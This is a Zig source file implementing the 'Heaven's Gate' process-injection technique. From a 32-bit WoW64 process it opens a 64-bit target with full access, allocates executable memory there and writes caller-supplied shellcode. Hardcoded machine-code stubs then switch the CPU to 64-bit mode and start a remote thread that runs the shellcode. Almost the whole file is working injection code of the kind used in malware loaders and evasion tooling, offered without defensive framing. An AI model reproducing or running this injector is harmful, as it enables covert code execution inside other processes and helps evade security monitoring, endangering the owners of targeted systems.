const std = @import("std");
const print = std.debug.print;
const windows = std.os.windows;
const WINAPI = windows.WINAPI;

// Windows types and constants
pub const HANDLE = windows.HANDLE;
pub const DWORD = windows.DWORD;
pub const ULONG = windows.ULONG;
pub const PVOID = windows.PVOID;
pub const LPVOID = windows.LPVOID;
pub const BYTE = windows.BYTE;
pub const PBYTE = [*]u8;
pub const BOOL = windows.BOOL;
pub const NTSTATUS = windows.NTSTATUS;
pub const SIZE_T = usize;
pub const LPCSTR = windows.LPCSTR;
pub const PDWORD = *DWORD;

pub const PROCESS_ALL_ACCESS = 0x001FFFFF;
pub const MEM_COMMIT = windows.MEM_COMMIT;
pub const MEM_RESERVE = windows.MEM_RESERVE;
pub const PAGE_READWRITE = windows.PAGE_READWRITE;
pub const PAGE_EXECUTE_READWRITE = windows.PAGE_EXECUTE_READWRITE;
pub const FALSE = windows.FALSE;
pub const INFINITE = windows.INFINITE;

const ProcessWow64Information = 26;
const STATUS_SUCCESS: NTSTATUS = @enumFromInt(0);

// Structure definitions for Heaven's Gate
pub const WOW64CONTEXT = extern struct {
    h: extern union {
        hProcess: HANDLE,
        bPadding2: [8]BYTE,
    },
    s: extern union {
        lpStartAddress: ?LPVOID,
        bPadding1: [8]BYTE,
    },
    p: extern union {
        lpParameter: ?LPVOID,
        bPadding2: [8]BYTE,
    },
    t: extern union {
        hThread: ?HANDLE,
        bPadding2: [8]BYTE,
    },
};

// Function pointer types for Heaven's Gate
pub const FN_FUNCTION64 = *const fn (arg: ULONG) callconv(WINAPI) BOOL;
pub const FN_EXECUTE64 = *const fn (function64: FN_FUNCTION64, arg: PVOID) callconv(WINAPI) ULONG;

const fnNtQueryInformationProcess = *const fn (
    ProcessHandle: HANDLE,
    ProcessInformationClass: ULONG,
    ProcessInformation: PVOID,
    ProcessInformationLength: ULONG,
    ReturnLength: ?*ULONG,
) callconv(WINAPI) NTSTATUS;

// External Windows API functions
extern "kernel32" fn OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD) callconv(WINAPI) ?HANDLE;
extern "kernel32" fn GetCurrentProcess() callconv(WINAPI) HANDLE;
extern "kernel32" fn GetLastError() callconv(WINAPI) DWORD;
extern "kernel32" fn GetModuleHandleA(lpModuleName: ?LPCSTR) callconv(WINAPI) ?HANDLE;
extern "kernel32" fn GetProcAddress(hModule: HANDLE, lpProcName: LPCSTR) callconv(WINAPI) ?PVOID;
extern "kernel32" fn VirtualAllocEx(hProcess: HANDLE, lpAddress: ?LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD) callconv(WINAPI) ?LPVOID;
extern "kernel32" fn WriteProcessMemory(hProcess: HANDLE, lpBaseAddress: LPVOID, lpBuffer: *const anyopaque, nSize: SIZE_T, lpNumberOfBytesWritten: ?*SIZE_T) callconv(WINAPI) BOOL;
extern "kernel32" fn CloseHandle(hObject: HANDLE) callconv(WINAPI) BOOL;
extern "kernel32" fn ResumeThread(hThread: HANDLE) callconv(WINAPI) DWORD;
extern "kernel32" fn WaitForSingleObject(hHandle: windows.HANDLE, dwMilliseconds: u32) callconv(WINAPI) u32;

// Heaven's Gate code stubs
const bExecute64 linksection(".text") = [_]u8{
    0x55, 0x89, 0xE5, 0x56, 0x57, 0x8B, 0x75, 0x08, 0x8B, 0x4D, 0x0C, 0xE8, 0x00, 0x00, 0x00, 0x00,
    0x58, 0x83, 0xC0, 0x2B, 0x83, 0xEC, 0x08, 0x89, 0xE2, 0xC7, 0x42, 0x04, 0x33, 0x00, 0x00, 0x00,
    0x89, 0x02, 0xE8, 0x0F, 0x00, 0x00, 0x00, 0x66, 0x8C, 0xD8, 0x66, 0x8E, 0xD0, 0x83, 0xC4, 0x14,
    0x5F, 0x5E, 0x5D, 0xC2, 0x08, 0x00, 0x8B, 0x3C, 0xE4, 0xFF, 0x2A, 0x48, 0x31, 0xC0, 0x57, 0xFF,
    0xD6, 0x5F, 0x50, 0xC7, 0x44, 0x24, 0x04, 0x23, 0x00, 0x00, 0x00, 0x89, 0x3C, 0x24, 0xFF, 0x2C,
    0x24,
};

const bFunction64 linksection(".text") = [_]u8{
    0xFC, 0x48, 0x89, 0xCE, 0x48, 0x89, 0xE7, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC8, 0x00, 0x00, 0x00,
    0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48,
    0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A,
    0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9,
    0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C,
    0x48, 0x01, 0xD0, 0x66, 0x81, 0x78, 0x18, 0x0B, 0x02, 0x75, 0x72, 0x8B, 0x80, 0x88, 0x00, 0x00,
    0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40,
    0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6,
    0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0,
    0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40,
    0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0,
    0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58,
    0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A,
    0x48, 0x8B, 0x12, 0xE9, 0x4F, 0xFF, 0xFF, 0xFF, 0x5D, 0x4D, 0x31, 0xC9, 0x41, 0x51, 0x48, 0x8D,
    0x46, 0x18, 0x50, 0xFF, 0x76, 0x10, 0xFF, 0x76, 0x08, 0x41, 0x51, 0x41, 0x51, 0x49, 0xB8, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xD2, 0x48, 0x8B, 0x0E, 0x41, 0xBA, 0xC8,
    0x38, 0xA4, 0x40, 0xFF, 0xD5, 0x48, 0x85, 0xC0, 0x74, 0x0C, 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xEB, 0x0A, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x83, 0xC4, 0x50, 0x48, 0x89, 0xFC, 0xC3,
};

/// Check if a process is running under WOW64
pub fn is_process_wow64(ProcessHandle: HANDLE) BOOL {
    var pNtQueryInformationProcess: fnNtQueryInformationProcess = undefined;
    var pIsWow64: ?*anyopaque = null;

    const ntdll_handle = GetModuleHandleA("NTDLL.DLL") orelse {
        print("[!] GetModuleHandleA failed\n", .{});
        return 0;
    };

    const proc_addr = GetProcAddress(ntdll_handle, "NtQueryInformationProcess") orelse {
        print("[!] GetProcAddress Failed With Error: {d}\n", .{GetLastError()});
        return 0;
    };

    pNtQueryInformationProcess = @ptrCast(@alignCast(proc_addr));

    const status = pNtQueryInformationProcess(ProcessHandle, ProcessWow64Information, @ptrCast(&pIsWow64), @sizeOf(?*anyopaque), null);
    if (status != STATUS_SUCCESS) {
        print("[!] NtQueryInformationProcess Failed With Error: 0x{X:0>8}\n", .{@intFromEnum(status)});
        return 0;
    }

    return if (pIsWow64 != null) 1 else 0;
}

// fn waitForEnter() void {
//     var buffer: [256]u8 = undefined;
//     _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\n') catch {};
// }

/// Execute Heaven's Gate technique to inject shellcode into a 64-bit process from WoW64
pub fn injectShellcode(process_id: ULONG, shellcode_buf: ?PVOID, shellcode_len: ULONG) BOOL {
    var process_handle: ?HANDLE = null;
    var virtual_memory: ?LPVOID = null;
    var fn_execute64: FN_EXECUTE64 = undefined;
    var fn_function64: FN_FUNCTION64 = undefined;
    var wow64_ctx: WOW64CONTEXT = std.mem.zeroes(WOW64CONTEXT);
    var written: SIZE_T = 0;
    var success: BOOL = 0;

    // Validate parameters
    if (process_id == 0 or shellcode_buf == null or shellcode_len == 0) {
        print("[-] Invalid parameters provided\n", .{});
        return 0;
    }

    // Cast .text code byte stubs to function pointers
    fn_execute64 = @ptrCast(@alignCast(&bExecute64[0]));
    fn_function64 = @ptrCast(@alignCast(&bFunction64[0]));

    // Open handle to remote process
    process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
    if (process_handle == null) {
        print("[-] OpenProcess Failed with Error: {x}\n", .{GetLastError()});
        return success;
    }

    print("[*] Opened process handle to {d}: {x}\n", .{ process_id, @intFromPtr(process_handle.?) });

    // Check if current process is Wow64
    if (is_process_wow64(GetCurrentProcess()) == 0) {
        print("[-] Current process is not a Wow64 process\n", .{});
        if (process_handle) |handle| {
            _ = CloseHandle(handle);
        }
        return success;
    } else {
        print("[*] Current process is Wow64\n", .{});
    }

    // Check if remote process is 64-bit (not Wow64)
    if (is_process_wow64(process_handle.?) != 0) {
        print("[-] Remote process {d} is a Wow64 process\n", .{process_id});
        if (process_handle) |handle| {
            _ = CloseHandle(handle);
        }
        return success;
    }

    print("[*] Process {d} ({x}) is 64-bit\n", .{ process_id, @intFromPtr(process_handle.?) });

    // Allocate memory in remote process
    virtual_memory = VirtualAllocEx(process_handle.?, null, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (virtual_memory == null) {
        print("[-] VirtualAllocEx Failed with Error: {d}\n", .{GetLastError()});
        if (process_handle) |handle| {
            _ = CloseHandle(handle);
        }
        return success;
    }

    print("[*] Allocated memory at: 0x{X} [{d} bytes]\n", .{ @intFromPtr(virtual_memory.?), shellcode_len });

    // Write shellcode to remote process
    if (WriteProcessMemory(process_handle.?, virtual_memory.?, shellcode_buf.?, shellcode_len, &written) == 0) {
        print("[-] WriteProcessMemory Failed with Error: {d}\n", .{GetLastError()});
        if (process_handle) |handle| {
            _ = CloseHandle(handle);
        }
        return success;
    }

    print("[*] Written to memory at: 0x{X} [{d} bytes written]\n", .{ @intFromPtr(virtual_memory.?), written });

    // waitForEnter();

    // Prepare 64-bit injection context
    wow64_ctx.h.hProcess = process_handle.?;
    wow64_ctx.s.lpStartAddress = virtual_memory;
    wow64_ctx.p.lpParameter = null;
    // hThread is already zeroed from std.mem.zeroes

    print("[*] About to execute Heaven's Gate transition...\n", .{});

    // Switch the processor to 64-bit mode and execute the 64-bit code stub
    const result = fn_execute64(fn_function64, @ptrCast(&wow64_ctx));
    print("[*] Heaven's Gate transition completed, result: {d}\n", .{result});

    if (result == 0) {
        print("[-] Failed to switch processor context and execute 64-bit stub\n", .{});
        if (process_handle) |handle| {
            _ = CloseHandle(handle);
        }
        return success;
    }

    // Check if remote thread was created
    if (@intFromPtr(wow64_ctx.t.hThread) == 0) {
        print("[-] Failed to create remote thread under 64-bit mode\n", .{});
        if (process_handle) |handle| {
            _ = CloseHandle(handle);
        }
        return success;
    }

    print("[*] Thread created: 0x{x}\n", .{@intFromPtr(wow64_ctx.t.hThread)});

    // Resume thread that has been created in a suspended state
    if (ResumeThread(wow64_ctx.t.hThread.?) == 0) {
        print("[-] ResumeThread Failed with Error: {d}\n", .{GetLastError()});
        if (process_handle) |handle| {
            _ = CloseHandle(handle);
        }
        return success;
    }

    print("[+] Successfully injected thread ({x})\n", .{@intFromPtr(wow64_ctx.t.hThread)});

    success = 1;

    // Cleanup
    if (process_handle) |handle| {
        _ = CloseHandle(handle);
    }

    return success;
}

/// Check if Heaven's Gate technique is available on current system
pub fn is_available() bool {
    return is_process_wow64(GetCurrentProcess()) == 1;
}
